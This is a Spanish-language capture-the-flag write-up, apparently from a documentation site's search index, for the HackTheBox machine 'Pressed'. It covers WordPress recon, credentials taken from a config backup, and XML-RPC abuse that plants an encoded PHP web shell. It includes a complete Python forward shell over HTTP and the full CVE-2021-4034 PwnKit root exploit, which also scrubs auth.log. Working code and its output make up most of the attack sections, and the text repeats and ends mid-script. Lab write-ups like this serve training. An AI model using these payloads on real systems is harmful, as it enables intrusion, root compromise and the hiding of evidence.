'__init__' , '__init_subclass__' , '__le__' , '__lt__' , '__module__' , '__ne__' , '__new__' , '__reduce__' , '__reduce_ex__' , '__repr__' , '__setattr__' , '__sizeof__' , '__str__' , '__subclasshook__' , '__weakref__' , '_def' , 'comment_status' , 'content' , 'custom_fields' , 'date' , 'date_modified' , 'definition' , 'excerpt' , 'guid' , 'id' , 'link' , 'menu_order' , 'mime_type' , 'parent_id' , 'password' , 'ping_status' , 'post_format' , 'post_status' , 'post_type' , 'slug' , 'sticky' , 'struct' , 'terms' , 'thumbnail' , 'title' , 'user' ] >>> plist [ 0 ] . user '1' >>> plist [ 0 ] . password '' >>> plist [ 0 ] . link '/index.php/2022/01/28/hello-world/' >>> plist [ 0 ] . content '<!-- wp:paragraph --> \\n <p>The UHC January Finals are underway! After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian. Metrics for this event can be found below.</p> \\n <!-- /wp:paragraph --> \\n\\n <!-- wp:php-everywhere-block/php {\"code\":\"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=\",\"version\":\"3.0.0\"} /--> \\n\\n <!-- wp:paragraph --> \\n <p></p> \\n <!-- /wp:paragraph --> \\n\\n <!-- wp:paragraph --> \\n <p></p> \\n <!-- /wp:paragraph -->' # Se crea una copia del post a modificar: >>> copia = client . call ( posts . GetPosts ())[ 0 ] >>> copia . content = '<!-- wp:paragraph --> \\n <p>The UHC January Finals are underway! After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian. Metrics for this event can be found below.</p> \\n <!-- /wp:paragraph --> \\n\\n <!-- wp:php-everywhere-block/php {\"code\":\"PD9waHAKCWZpbGVfcHV0X2NvbnRlbnRzKCd4c2hlbGwucGhwJywgYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUtDV1ZqYUc4Z2MyaGxiR3hmWlhobFl5Z2tYMUpGVVZWRlUxUmJKMk50WkNkZEtUc0tQejRLJykpOwoJZWNobygiU3VjY2VzcyIpOwo/Pgo=\",\"version\":\"3.0.0\"} /--> \\n\\n <!-- wp:paragraph --> \\n <p></p> \\n <!-- /wp:paragraph --> \\n\\n <!-- wp:paragraph --> \\n <p></p> \\n <!-- /wp:paragraph -->' client . call ( posts . NewPost ( copia )) '49' # Una vez ejecutado el post, ya tenemos RCE: http : // pressed . htb / xshell . php ? cmd = id ## Alternativa EDITAR original - Se indica el id del post que se quiere editar y la copia modificada para machacar el original: >>> client . call ( posts . EditPost ( malicious_post . id , malicious_post )) True ## Repaso de como copiar - De este modo se puede copiar un post existente a uno nuevo o incluso borrarlo: >>> targetpost = client . call ( wp . posts . GetPosts ())[ 0 ] >>> client . call ( posts . NewPost ( targetpost )) '50' >>> client . call ( posts . DeletePost ( targetpost )) True Explotation Ya que la m\u00e1quina tiene iptables y rechaza las conexiones tcp y udp, se usa una fakeshell ttyoverhttp: #!/usr/bin/python3 import requests, time, threading, pdb, signal, sys from base64 import b64encode from random import randrange class AllTheReads ( object ) : def __init__ ( self, interval = 1 ) : self.interval = interval thread = threading.Thread ( target = self.run, args =()) thread.daemon = True thread.start () def run ( self ) : readoutput = \"\"\"/bin/cat %s\"\"\" % ( stdout ) clearoutput = \"\"\"echo '' > %s\"\"\" % ( stdout ) while True: output = RunCmd ( readoutput ) if output: RunCmd ( clearoutput ) print ( output ) time.sleep ( self.interval ) def RunCmd ( cmd ) : cmd = cmd.encode ( 'utf-8' ) cmd = b64encode ( cmd ) .decode ( 'utf-8' ) payload = { 'cmd' : 'echo \"%s\" | base64 -d | sh' % ( cmd ) } result = ( requests.get ( 'http://pressed.htb/xshell.php' , params = payload, timeout = 5 ) .text ) .strip () return result def WriteCmd ( cmd ) : cmd = cmd.encode ( 'utf-8' ) cmd = b64encode ( cmd ) .decode ( 'utf-8' ) payload = { 'cmd' : 'echo \"%s\" | base64 -d > %s' % ( cmd, stdin ) } result = ( requests.get ( 'http://pressed.htb/xshell.php' , params = payload, timeout = 5 ) .text ) .strip () return result def ReadCmd () : GetOutput = \"\"\"/bin/cat %s\"\"\" % ( stdout ) output = RunCmd ( GetOutput ) return output def SetupShell () : NamedPipes = \"\"\"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s\"\"\" % ( stdin, stdin, stdout ) try: RunCmd ( NamedPipes ) except: None return None global stdin, stdout session = randrange ( 1000 , 9999 ) stdin = \"/dev/shm/input.%s\" % ( session ) stdout = \"/dev/shm/output.%s\" % ( session ) erasestdin = \"\"\"/bin/rm %s\"\"\" % ( stdin ) erasestdout = \"\"\"/bin/rm %s\"\"\" % ( stdout ) SetupShell () ReadingTheThings = AllTheReads () def sig_handler ( sig, frame ) : print ( \"\\n\\n[*] Exiting...\\n\" ) print ( \"[*] Removing files...\\n\" ) RunCmd ( erasestdin ) RunCmd ( erasestdout ) print ( \"[*] All files have been deleted\\n\" ) sys.exit ( 0 ) signal.signal ( signal.SIGINT, sig_handler ) while True: cmd = input ( \"> \" ) WriteCmd ( cmd + \"\\n\" ) time.sleep ( 1 .1 ) PostExplotation - PWNKIT Existe un exploit para escalar a traves del binario /usr/bin/pkexec: #!/bin/bash echo \"\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \" echo \"\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\" echo \"\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\" echo \"\u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\" echo \"\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551\" echo \"\u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d\" echo \"CVE-2021-4034 PoC by Kim Schulz\" # shell poc by Kim Schulz echo \"[+] Setting up environment...\" mkdir -p 'GCONV_PATH=.' touch 'GCONV_PATH=./pkwner' chmod a+x 'GCONV_PATH=./pkwner' mkdir -p pkwner echo \"module UTF-8// PKWNER// pkwner 2\" > pkwner/gconv-modules cat > pkwner/pkwner.c <<- EOM #include <stdio.h> #include <stdlib.h> #include <unistd.h> void gconv() {} void gconv_init() { printf(\"hello\"); setuid(0); setgid(0); seteuid(0); setegid(0); system(\"PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;\" \"rm -rf 'GCONV_PATH=.' 'pkwner';\" \"cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;\" \"/bin/bash\"); exit(0); } EOM cat > pkwner/exec.c <<- EOM #include <stdlib.h> #include <unistd.h> int main(){ char *env[] = {\"pkwner\", \"PATH=GCONV_PATH=.\", \"CHARSET=PKWNER\", \"SHELL=pkwner\", NULL}; execve(\"/usr/bin/pkexec\", (char *[]){NULL}, env); } EOM echo \"[+] Build offensive gconv shared module...\" gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c echo \"[+] Build mini executor...\" gcc -o pkwner/executor pkwner/exec.c # export PATH=\"GCONV_PATH=.\" # export CHARSET=\"PKWNER\" #export SHELL=pkwner PATH = 'GCONV_PATH=.' ./pkwner/executor echo \"[+] Nice Job\" Escalado a root: Tras ejecutar el exploit en la ttyoverhttp se escala a root: pwnkit.sh \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d CVE-2021-4034 PoC by Kim Schulz [ + ] Setting up environment... [ + ] Build offensive gconv shared module... [ + ] Build mini executor... id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) ,33 ( www-data ) whoami root cat /root/root.txt 5e4234f88f66431f1513e2bee958ef20","title":"Pressed"},{"location":"maquinas/linux/pressed/#pressed-htb","text":"","title":"Pressed HTB"},{"location":"maquinas/linux/pressed/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: 10.10.11.142","title":"Recon"},{"location":"maquinas/linux/pressed/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.11.142 Se realiza un scan de los puertos abiertos: nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN openPorts # Nmap 7.92 scan initiated Sat Aug 20 15:51:49 2022 as: nmap -sCV -p80 -oN openPorts 10.10.11.142 Nmap scan report for 10.10.11.142 Host is up (0.041s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: UHC Jan Finals &#8211; New Month, New Boxes |_http-generator: WordPress 5.9 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 20 15:51:59 2022 -- 1 IP address (1 host up) scanned in 10.06 seconds","title":"Enum"},{"location":"maquinas/linux/pressed/#wpscan-backup-config","text":"Se encuentra un wordpress, y tras revisarlo con wpscan localiza un backup de de la configuraci\u00f3n con credenciales. wpscan --url http://pressed.htb _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ \u00ae \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.21 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://pressed.htb/ [10.10.11.142] [+] Started: Sat Aug 20 20:03:12 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://pressed.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://pressed.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://pressed.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.9 identified (Insecure, released on 2022-01-25). | Found By: Rss Generator (Passive Detection) | - http://pressed.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.9</generator> | - http://pressed.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.9</generator> [+] WordPress theme in use: retrogeek | Location: http://pressed.htb/wp-content/themes/retrogeek/ | Last Updated: 2022-04-23T00:00:00.000Z | Readme: http://pressed.htb/wp-content/themes/retrogeek/README.txt | [!] The version is out of date, the latest version is 0.6 | Style URL: http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42 | Style Name: RetroGeek | Style URI: https://tuxlog.de/retrogeek/ | Description: A lightweight, minimal, fast and geeky retro theme remembering the good old terminal times... | Author: tuxlog | Author URI: https://tuxlog.de/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 0.5 (80% confidence) | Found By: Style (Passive Detection) | - http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42, Match: 'Version: 0.5' [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:53 <=============================================================================================================> (137 / 137) 100.00% Time: 00:00:53 [i] Config Backup(s) Identified: [!] http://pressed.htb/wp-config.php.bak | Found By: Direct Access (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Aug 20 20:04:35 2022 [+] Requests Done: 173 [+] Cached Requests: 5 [+] Data Sent: 43.68 KB [+] Data Received: 126.261 KB [+] Memory used: 234.438 MB [+] Elapsed time: 00:01:23 Credenciales encontrados (wp-config.php.bak): define( 'DB_NAME', 'wordpress' ); /** Database username */ define( 'DB_USER', 'admin' ); /** Database password */ define( 'DB_PASSWORD', 'uhc-jan-finals-2021' ); /** Database hostname */ define( 'DB_HOST', 'localhost' ); Acceso a http://pressed.htb/wp-login.php modificando ligeramente las credenciales nos da acceso a un 2FA (OTP): admin:uhc-jan-finals-2022 Este Wordpress tiene habilitada la API de xmlrpc, donde se pueden enumerar los m\u00e9todos y conseguir la flag de user: curl -d '<?xml version=\"1.0\"?> <methodCall> <methodName>system.listMethods</methodName> <params> </params> </methodCall>' http://pressed.htb/xmlrpc.php <?xml version = \"1.0\" encoding = \"UTF-8\" ?> <methodResponse> <params> <param> <value> <array><data> <value><string>system.multicall</string></value> <value><string>system.listMethods</string></value> <value><string>system.getCapabilities</string></value> <value><string>htb.get_flag</string></value> <value><string>demo.addTwoNumbers</string></value> <value><string>demo.sayHello</string></value> <value><string>pingback.extensions.getPingbacks</string></value> <value><string>pingback.ping</string></value> <value><string>mt.publishPost</string></value> <value><string>mt.getTrackbackPings</string></value> <value><string>mt.supportedTextFilters</string></value> <value><string>mt.supportedMethods</string></value> <value><string>mt.setPostCategories</string></value> <value><string>mt.getPostCategories</string></value> <value><string>mt.getRecentPostTitles</string></value> <value><string>mt.getCategoryList</string></value> <value><string>metaWeblog.getUsersBlogs</string></value> <value><string>metaWeblog.deletePost</string></value> <value><string>metaWeblog.newMediaObject</string></value> <value><string>metaWeblog.getCategories</string></value> <value><string>metaWeblog.getRecentPosts</string></value> <value><string>metaWeblog.getPost</string></value> <value><string>metaWeblog.editPost</string></value> <value><string>metaWeblog.newPost</string></value> <value><string>blogger.deletePost</string></value> <value><string>blogger.editPost</string></value> <value><string>blogger.newPost</string></value> <value><string>blogger.getRecentPosts</string></value> <value><string>blogger.getPost</string></value> <value><string>blogger.getUserInfo</string></value> <value><string>blogger.getUsersBlogs</string></value> <value><string>wp.restoreRevision</string></value> <value><string>wp.getRevisions</string></value> <value><string>wp.getPostTypes</string></value> <value><string>wp.getPostType</string></value> <value><string>wp.getPostFormats</string></value> <value><string>wp.getMediaLibrary</string></value> <value><string>wp.getMediaItem</string></value> <value><string>wp.getCommentStatusList</string></value> <value><string>wp.newComment</string></value> <value><string>wp.editComment</string></value> <value><string>wp.deleteComment</string></value> <value><string>wp.getComments</string></value> <value><string>wp.getComment</string></value> <value><string>wp.setOptions</string></value> <value><string>wp.getOptions</string></value> <value><string>wp.getPageTemplates</string></value> <value><string>wp.getPageStatusList</string></value> <value><string>wp.getPostStatusList</string></value> <value><string>wp.getCommentCount</string></value> <value><string>wp.deleteFile</string></value> <value><string>wp.uploadFile</string></value> <value><string>wp.suggestCategories</string></value> <value><string>wp.deleteCategory</string></value> <value><string>wp.newCategory</string></value> <value><string>wp.getTags</string></value> <value><string>wp.getCategories</string></value> <value><string>wp.getAuthors</string></value> <value><string>wp.getPageList</string></value> <value><string>wp.editPage</string></value> <value><string>wp.deletePage</string></value> <value><string>wp.newPage</string></value> <value><string>wp.getPages</string></value> <value><string>wp.getPage</string></value> <value><string>wp.editProfile</string></value> <value><string>wp.getProfile</string></value> <value><string>wp.getUsers</string></value> <value><string>wp.getUser</string></value> <value><string>wp.getTaxonomies</string></value> <value><string>wp.getTaxonomy</string></value> <value><string>wp.getTerms</string></value> <value><string>wp.getTerm</string></value> <value><string>wp.deleteTerm</string></value> <value><string>wp.editTerm</string></value> <value><string>wp.newTerm</string></value> <value><string>wp.getPosts</string></value> <value><string>wp.getPost</string></value> <value><string>wp.deletePost</string></value> <value><string>wp.editPost</string></value> <value><string>wp.newPost</string></value> <value><string>wp.getUsersBlogs</string></value> </data></array> </value> </param> </params> </methodResponse> Se lista a continuaci\u00f3n un m\u00e9todo que devuelve la flag de user: curl -d '<?xml version=\"1.0\"?> <methodCall> <methodName>htb.get_flag</methodName> <params> </params> </methodCall>' http://pressed.htb/xmlrpc.php <?xml version=\"1.0\" encoding=\"UTF-8\"?> <methodResponse> <params> <param> <value> <string>7be142b7b81c7bef57b39008e63626ef </string> </value> </param> </params> </methodResponse> Hay una librer\u00eda de Python para gestionar xmlrpc de wordpress: Documentacion python-wordpress-xmlrpc >>> from wordpress_xmlrpc import Client >>> from wordpress_xmlrpc.methods import posts >>> client = Client ( 'http://pressed.htb/xmlrpc.php' , 'admin' , 'uhc-jan-finals-2022' ) >>> plist = client . call ( posts . GetPosts ()) >>> plist [ < WordPressPost : b 'UHC January Finals Under Way' > ] >>> dir ( plist [ 0 ]) [ '__class__' , '__delattr__' , '__dict__' , '__dir__' , '__doc__' , '__eq__' , '__format__' , '__ge__' , '__getattribute__' , '__gt__' , '__hash__' , '__init__' , '__init_subclass__' , '__le__' , '__lt__' , '__module__' , '__ne__' , '__new__' , '__reduce__' , '__reduce_ex__' , '__repr__' , '__setattr__' , '__sizeof__' , '__str__' , '__subclasshook__' , '__weakref__' , '_def' , 'comment_status' , 'content' , 'custom_fields' , 'date' , 'date_modified' , 'definition' , 'excerpt' , 'guid' , 'id' , 'link' , 'menu_order' , 'mime_type' , 'parent_id' , 'password' , 'ping_status' , 'post_format' , 'post_status' , 'post_type' , 'slug' , 'sticky' , 'struct' , 'terms' , 'thumbnail' , 'title' , 'user' ] >>> plist [ 0 ] . user '1' >>> plist [ 0 ] . password '' >>> plist [ 0 ] . link '/index.php/2022/01/28/hello-world/' >>> plist [ 0 ] . content '<!-- wp:paragraph --> \\n <p>The UHC January Finals are underway! After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian. Metrics for this event can be found below.</p> \\n <!-- /wp:paragraph --> \\n\\n <!-- wp:php-everywhere-block/php {\"code\":\"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=\",\"version\":\"3.0.0\"} /--> \\n\\n <!-- wp:paragraph --> \\n <p></p> \\n <!-- /wp:paragraph --> \\n\\n <!-- wp:paragraph --> \\n <p></p> \\n <!-- /wp:paragraph -->' # Se crea una copia del post a modificar: >>> copia = client . call ( posts . GetPosts ())[ 0 ] >>> copia . content = '<!-- wp:paragraph --> \\n <p>The UHC January Finals are underway! After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian. Metrics for this event can be found below.</p> \\n <!-- /wp:paragraph --> \\n\\n <!-- wp:php-everywhere-block/php {\"code\":\"PD9waHAKCWZpbGVfcHV0X2NvbnRlbnRzKCd4c2hlbGwucGhwJywgYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUtDV1ZqYUc4Z2MyaGxiR3hmWlhobFl5Z2tYMUpGVVZWRlUxUmJKMk50WkNkZEtUc0tQejRLJykpOwoJZWNobygiU3VjY2VzcyIpOwo/Pgo=\",\"version\":\"3.0.0\"} /--> \\n\\n <!-- wp:paragraph --> \\n <p></p> \\n <!-- /wp:paragraph --> \\n\\n <!-- wp:paragraph --> \\n <p></p> \\n <!-- /wp:paragraph -->' client . call ( posts . NewPost ( copia )) '49' # Una vez ejecutado el post, ya tenemos RCE: http : // pressed . htb / xshell . php ? cmd = id ## Alternativa EDITAR original - Se indica el id del post que se quiere editar y la copia modificada para machacar el original: >>> client . call ( posts . EditPost ( malicious_post . id , malicious_post )) True ## Repaso de como copiar - De este modo se puede copiar un post existente a uno nuevo o incluso borrarlo: >>> targetpost = client . call ( wp . posts . GetPosts ())[ 0 ] >>> client . call ( posts . NewPost ( targetpost )) '50' >>> client . call ( posts . DeletePost ( targetpost )) True","title":"wpscan (backup config)"},{"location":"maquinas/linux/pressed/#explotation","text":"Ya que la m\u00e1quina tiene iptables y rechaza las conexiones tcp y udp, se usa una fakeshell ttyoverhttp: #!/usr/bin/python3 import requests, time, threading, pdb, signal, sys from base64 import b64encode from random import randrange class AllTheReads ( object ) : def __init__ ( self, interval = 1 ) : self.interval = interval thread = threading.Thread ( target = self.run, args =()) thread.daemon = True thread.start () def run ( self ) : readoutput = \"\"\"/bin/cat %s\"\"\" % ( stdout ) clearoutput = \"\"\"echo '' > %s\"\"\" % ( stdout ) while True: output = RunCmd ( readoutput ) if output: RunCmd ( clearoutput ) print ( output ) time.sleep ( self.interval ) def RunCmd ( cmd ) : cmd = cmd.encode ( 'utf-8' ) cmd = b64encode ( cmd ) .decode ( 'utf-8' ) payload = { 'cmd' : 'echo \"%s\" | base64 -d | sh' % ( cmd ) } result = ( requests.get ( 'http://pressed.htb/xshell.php' , params = payload, timeout = 5 ) .text ) .strip () return result def WriteCmd ( cmd ) : cmd = cmd.encode ( 'utf-8' ) cmd = b64encode ( cmd ) .decode ( 'utf-8' ) payload = { 'cmd' : 'echo \"%s\" | base64 -d > %s' % ( cmd, stdin ) } result = ( requests.get ( 'http://pressed.htb/xshell.php' , params = payload, timeout = 5 ) .text ) .strip () return result def ReadCmd () : GetOutput = \"\"\"/bin/cat %s\"\"\" % ( stdout ) output = RunCmd ( GetOutput ) return output def SetupShell () : NamedPipes = \"\"\"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s\"\"\" % ( stdin, stdin, stdout ) try: RunCmd ( NamedPipes ) except: None return None global stdin, stdout session = randrange ( 1000 , 9999 ) stdin = \"/dev/shm/input.%s\" % ( session ) stdout = \"/dev/shm/output.%s\" % ( session ) erasestdin = \"\"\"/bin/rm %s\"\"\" % ( stdin ) erasestdout = \"\"\"/bin/rm %s\"\"\" % ( stdout ) SetupShell () ReadingTheThings = AllTheReads () def sig_handler ( sig, frame ) : print ( \"\\n\\n[*] Exiting...\\n\" ) print ( \"[*] Removing files...\\n\" ) RunCmd ( erasestdin ) RunCmd ( erasestdout ) print ( \"[*] All files have been deleted\\n\" ) sys.exit ( 0 ) signal.signal ( signal.SIGINT, sig_handler ) while True: cmd = input ( \"> \" ) WriteCmd ( cmd + \"\\n\" ) time.sleep ( 1 .1 )","title":"Explotation"},{"location":"maquinas/linux/pressed/#postexplotation-pwnkit","text":"Existe un exploit para escalar a traves del binario /usr/bin/pkexec: #!/bin/bash echo \"\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \" echo \"\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\" echo \"\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\" echo \"\u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\" echo \"\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551\" echo \"\u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d\" echo \"CVE-2021-4034 PoC by Kim Schulz\" # shell poc by Kim Schulz echo \"[+] Setting up environment...\" mkdir -p 'GCONV_PATH=.' touch 'GCONV_PATH=./pkwner' chmod a+x 'GCONV_PATH=./pkwner' mkdir -p pkwner echo \"module UTF-8// PKWNER// pkwner 2\" > pkwner/gconv-modules cat > pkwner/pkwner.c <<- EOM #include <stdio.h> #include <stdlib.h> #include <unistd.h> void gconv() {} void gconv_init() { printf(\"hello\"); setuid(0); setgid(0); seteuid(0); setegid(0); system(\"PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;\" \"rm -rf 'GCONV_PATH=.' 'pkwner';\" \"cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;\" \"/bin/bash\"); exit(0); } EOM cat > pkwner/exec.c <<- EOM #include <stdlib.h> #include <unistd.h> int main(){ char *env[] = {\"pkwner\", \"PATH=GCONV_PATH=.\", \"CHARSET=PKWNER\", \"SHELL=pkwner\", NULL}; execve(\"/usr/bin/pkexec\", (char *[]){NULL}, env); } EOM echo \"[+] Build offensive gconv shared module...\" gcc 